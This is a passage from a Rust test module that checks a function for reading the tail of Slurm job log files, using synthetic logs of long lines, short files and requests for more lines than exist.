        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-31415.out");
        // Synthesise a log whose only line is 20 KiB of content
        // followed by a single trailing `\n`. The 20 KiB exceeds
        // the 1 KiB-per-line estimate by a 20x factor; pre-fix the
        // seek would land 1 KiB before EOF (well inside the line)
        // and the partial-line-discard logic would eat the rest,
        // returning Vec::new().
        const LINE_BYTES: usize = 20 * 1024;
        let big_line: String = "Z".repeat(LINE_BYTES);
        {
            let mut f = std::fs::File::create(&log_path).unwrap();
            f.write_all(big_line.as_bytes()).unwrap();
            f.write_all(b"\n").unwrap();
            f.sync_all().unwrap();
        }
        let tail = read_slurm_log_tail(&dir, "31415", 1).expect("read tail");
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(
            tail.len(),
            1,
            "doubling-walk must surface the long line, got {tail:?}",
        );
        assert_eq!(
            tail[0].len(),
            LINE_BYTES,
            "tail line must be the full 20 KiB record, got len={}",
            tail[0].len(),
        );
        assert!(
            tail[0].chars().all(|c| c == 'Z'),
            "tail line must be the 'Z'-filled record, got first 16 chars: {:?}",
            &tail[0][..16.min(tail[0].len())],
        );
    }

    /// RED→GREEN (round-27 M3): a small log (≤ initial tail_bytes
    /// estimate) returns its lines in a SINGLE pass — the
    /// previously-implicit "always wraparound when file_len ≤
    /// tail_bytes" path is now an explicit early-break, no
    /// redundant re-scans even when the doubling-walk fallback
    /// budget gets exercised on contrived inputs.
    ///
    /// We verify the pre-rename "must complete in 1 iteration"
    /// contract via timing: a 1 KiB log read 31 redundant times
    /// would not be observably different in wall-clock from a
    /// single scan on a fast disk, so the assertion is instead
    /// "we return the expected lines AND the call finishes
    /// quickly". The behavioural anchor here is that the new
    /// early-break doesn't break the happy path for tiny logs —
    /// the perf optimisation is the cherry on top.
    #[test]
    fn read_slurm_log_tail_small_log_single_pass_round27_m3() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-r27-m3-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-271828.out");
        // 1 KiB log with 10 short lines — fits inside the initial
        // tail_bytes window for any reasonable n.
        let lines: Vec<String> = (0..10).map(|i| format!("line {i}")).collect();
        {
            let mut f = std::fs::File::create(&log_path).unwrap();
            for l in &lines {
                f.write_all(l.as_bytes()).unwrap();
                f.write_all(b"\n").unwrap();
            }
            f.sync_all().unwrap();
        }
        let start = std::time::Instant::now();
        // Request 10 lines — should be returned without wasting
        // doubling-walk iterations.
        let tail = read_slurm_log_tail(&dir, "271828", 10).expect("read tail");
        let elapsed = start.elapsed();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(tail, lines, "tail must return all 10 lines verbatim");
        // Sanity check: a 1 KiB file read should complete in well
        // under a second even on the slowest CI runners. If we'd
        // looped 32x re-reading the same bytes the call would still
        // be fast; this assertion mostly pins that "we don't spin"
        // (e.g. a regression that walks the file 1000x would still
        // miss this threshold by orders of magnitude).
        assert!(
            elapsed < std::time::Duration::from_secs(5),
            "1 KiB tail read took {elapsed:?} — possible redundant-iteration regression",
        );
    }

    /// Round-28 H1 regression guard (NOT RED→GREEN — it passes both
    /// pre- and post-fix, see below): anchors that deleting the
    /// structurally unreachable `previous_seek_offset == Some(0)`
    /// early-break does not regress the small-log path. Pre-R28 the
    /// early-break was dead code, so removing it must leave the
    /// small-log doubling-walk happy-path identical. We feed
    /// `tail_log_n` a 50-line file with `n=100` (callers asking for
    /// more lines than exist) and assert all 50 lines are returned
    /// without panic or empty result. The early-break being
    /// unreachable means this test passes both pre-fix and post-fix;
    /// it guards the deletion against an accidental future regression
    /// that re-introduces a broken early-break gating the small-log
    /// path.
    #[test]
    fn read_slurm_log_tail_50_lines_with_n_100_round28_h1() {
        use std::io::Write;
        let dir = std::env::temp_dir().join(format!(
            "valenx-slurm-r28-h1-{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let log_path = dir.join("slurm-31415.out");
        let lines: Vec<String> = (0..50).map(|i| format!("rank-{i:03} tick")).collect();
        {
            let mut f = std::fs::File::create(&log_path).unwrap();
            for l in &lines {
                f.write_all(l.as_bytes()).unwrap();
                f.write_all(b"\n").unwrap();
            }
            f.sync_all().unwrap();
        }
        let tail = read_slurm_log_tail(&dir, "31415", 100).expect("read tail");
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(
            tail, lines,
            "50-line file with n=100 must return all 50 lines verbatim"
        );
    }
}
